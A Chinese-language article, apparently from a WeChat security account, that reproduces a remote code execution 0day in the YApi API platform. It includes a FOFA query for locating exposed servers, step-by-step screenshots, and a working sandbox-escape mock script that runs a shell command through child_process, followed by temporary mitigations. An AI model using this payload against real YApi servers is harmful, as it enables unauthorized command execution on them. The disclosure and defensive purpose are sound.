> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/zobag3-fIl_0vrc8BrnRjg)

近日，网络上爆出 YApi 的远程代码执行 0day 漏洞 正被广泛利用。攻击者通过注册用户后，即可通过 Mock 功能远程执行任意代码。

漏洞描述
----

YAPI 接口管理平台是国内某旅行网站的大前端技术中心开源项目，使用 mock 数据 / 脚本作为中间交互层，为前端后台开发与测试人员提供更优雅的接口管理服务，该系统被国内较多知名互联网企业所采用。YApi 是高效、易用、功能强大的 api 管理平台。但因为大量用户使用 YAPI 的默认配置并允许从外部网络访问 YApi 服务，导致攻击者注册用户后，即可通过 Mock 功能远程执行任意代码。

fofa 语法

```
app="YApi"
```

漏洞复现过程：  

这是主页~~~~~~~

![](https://mmbiz.qpic.cn/mmbiz_png/rFvFNYa3ibHZKxQegzv52C35pibz8kvpGmAGzliakpwzzTjwH7mibGVIGvibtIL04kd0Jj4LuaQ2IiakibfEfgHMBnZkA/640?wx_fmt=png)

首先注册一个用户

![](https://mmbiz.qpic.cn/mmbiz_png/rFvFNYa3ibHZKxQegzv52C35pibz8kvpGmYLEa0bJibhrc4Yr03nzczTxibeUCp6sAIpicsuLpZjMnVpoL7ldQiaZX7Q/640?wx_fmt=png)

接着新建一个项目

![](https://mmbiz.qpic.cn/mmbiz_png/rFvFNYa3ibHZKxQegzv52C35pibz8kvpGmoms5TC0fx21U6mdibv9rFW4tSajvviaiaHa9d81yfibgMGQnAqP6geOucg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rFvFNYa3ibHZKxQegzv52C35pibz8kvpGmx2damXJqK8xgLKAMNTr8kkg5yiaExm7Q9N77I7iaTnVibaS9XzqgyAfaw/640?wx_fmt=png)

接着返回项目首页新建一个接口~~~~~~~~

![](https://mmbiz.qpic.cn/mmbiz_png/rFvFNYa3ibHZKxQegzv52C35pibz8kvpGmia091rX3EJM8xfWeLHD6Rlt4D9K4k7DtEhLoIibgOjctXTyKVKE61rBQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rFvFNYa3ibHZKxQegzv52C35pibz8kvpGmBlOdeibwDDfVMPfZXVLykuOBfD365TXgawyvKp74cq44DNFYWmq4TNw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/rFvFNYa3ibHZKxQegzv52C35pibz8kvpGm4ic6t97shj7xiaF0KTqmr5LbytW75ZoToPUgjvkD8qQAicav6LCTyPZCA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rFvFNYa3ibHZKxQegzv52C35pibz8kvpGmlzcTRvfXDhlLqjR0ZzFJ4YkbaJ3qtqnJibJt9X8QL6sWFUuib7qaY2nA/640?wx_fmt=png)

写入 exp！！！！！  

![](https://mmbiz.qpic.cn/mmbiz_png/rFvFNYa3ibHZKxQegzv52C35pibz8kvpGmjF3DE7eW4OFJIWqZxUd9VlHhHLZsWHJc9y8DaicG6bbjEzll3H10ZFQ/640?wx_fmt=png)

exp：  

```
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("whoami").toString()
```

保存后直接访问接口  

![](https://mmbiz.qpic.cn/mmbiz_png/rFvFNYa3ibHZKxQegzv52C35pibz8kvpGmiaafaS53gFa5w7FCsiaBIJicO5qiaQKTFzsUdq7tenE2N3AsdfUX8ASMQw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rFvFNYa3ibHZKxQegzv52C35pibz8kvpGm4FSDnkszKXEDMiaV0HgGUe3zZviaciaeHBPaT5OygOS4UbaJxu17tABqA/640?wx_fmt=png)

修复建议
----

该漏洞暂无补丁。

临时修复建议：

1.  关闭 YAPI 用户注册功能，以阻断攻击者注册。
    
2.  利用请求白名单的方式限制 YAPI 相关端口。
    
3.  排查 YAPI 服务器是否存在恶意访问记录。
    

切勿非法用途，履行白帽职责。

![](https://mmbiz.qpic.cn/mmbiz_jpg/rFvFNYa3ibHZKxQegzv52C35pibz8kvpGmiatxb5D0fwEwaJoAZABWeZrgGzyXjAcGcDibsFSh1FkvOzicibHYFkwJqQ/640?wx_fmt=jpeg)